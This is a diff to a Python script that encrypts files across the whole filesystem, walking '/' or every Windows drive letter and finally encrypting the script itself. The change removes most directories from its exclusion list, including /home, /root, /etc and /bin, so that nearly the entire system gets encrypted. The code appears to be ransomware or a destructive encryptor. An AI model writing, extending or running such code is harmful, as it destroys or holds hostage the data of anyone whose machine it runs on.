@@ -48,36 +48,12 @@ python_env_path = os.path.dirname(os.path.dirname(sys.executable))
 # Get the Node.js environment path managed by nvm
 nvm_path = os.path.expanduser("~/.nvm")
 
-# Paths to exclude
+# Additional paths to exclude
 EXCLUDE_PATHS = [
     os.path.abspath(python_env_path),
     os.path.abspath(os.path.dirname(__file__)),
     os.path.abspath(nvm_path),
-    "/usr/share/vim",  # Exclude Vim directories
-    "/bin",
-    "/sbin",
-    "/lib",
-    "/lib64",
-    "/usr/bin",
-    "/usr/sbin",
-    "/usr/lib",
-    "/usr/lib64",
-    "/etc",
-    "/dev",
-    "/proc",
-    "/sys",
-    "/run",
-    "/boot",
-    "/boot/efi",
-    "/usr/src",
-    "/home",
-    "/root",
-    "/tmp",
-    "/var/tmp",
-    "/var/log",
-    "/usr/local",
-    "/opt"
-    "/usr/share/man"
+    '/usr/share'
 ]
 
 # Function to encrypt a file
@@ -135,10 +111,8 @@ def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
 # Main function
 def main():
     root_dirs = ["/"] if platform.system() != "Windows" else [drive + ":\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(drive + ":\\")]
-    exclude_paths = [os.path.abspath(python_env_path), os.path.abspath(os.path.dirname(__file__)), os.path.abspath(nvm_path), "/usr/share/vim"]
-    
     for root_dir in root_dirs:
-        encrypt_files_in_chunks(root_dir, exclude_paths)
+        encrypt_files_in_chunks(root_dir, EXCLUDE_PATHS)
     
     # Finally encrypt the current script
     for script in EXCLUDE_FILES:
